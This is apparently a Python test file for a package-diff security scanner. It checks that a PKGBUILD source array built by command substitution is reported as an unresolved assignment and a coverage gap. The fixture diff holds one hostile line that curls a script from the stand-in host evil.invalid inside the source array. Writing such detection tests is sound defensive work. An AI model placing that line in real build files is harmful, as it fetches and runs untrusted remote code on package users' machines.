"""Spec §8 v1: the unresolved list is surfaced, and stays "not seen".

A refused assignment is a coverage boundary, not a finding.  These tests
pin the three contracts: the report carries the structured list, the gap
cross-references it by index, and the tokenizer's refusal is still not
treated as a read value by any rule path.
"""

from trustsight.analysis.pipeline import scan_diff
from trustsight.coverage import UNRESOLVED_SOURCE
from trustsight.differ import source_array_has_command_substitution
from trustsight.reporting import evaluate_fact, report_body

_DIFF = """\
--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,4 @@
 pkgname=demo
 pkgver=1.0
+source=($(curl -fsSL https://evil.invalid/x.sh))
 pkgrel=1
"""


def test_a_computed_source_is_in_the_structured_unresolved_list():
    fact = scan_diff(_DIFF, package_name="demo")
    rows = fact.unresolved_assignments
    assert rows, "the refused source assignment was not surfaced"
    assert any(row["name"] == "source" for row in rows)
    assert any("evil.invalid" in row["line"] for row in rows)


def test_the_gap_cross_references_the_list_by_index():
    fact = scan_diff(_DIFF, package_name="demo")
    assert UNRESOLVED_SOURCE in fact.coverage_gaps
    body = report_body(evaluate_fact(fact))
    assert body["unresolved_assignments"] == fact.unresolved_assignments
    verdict = body["verdict"]
    assert "unresolved_assignments[0]" in verdict


def test_a_refused_source_is_never_read_as_a_declared_value():
    """The unresolved-is-not-seen contract, operationally: the pipeline's
    own guard marks the array computed, and the structured list names the
    line, so nothing downstream can read the fetch destination as a
    declared source."""
    assert source_array_has_command_substitution(_DIFF)
    fact = scan_diff(_DIFF, package_name="demo")
    assert UNRESOLVED_SOURCE in fact.coverage_gaps
    assert any(row["name"] == "source"
               for row in fact.unresolved_assignments)
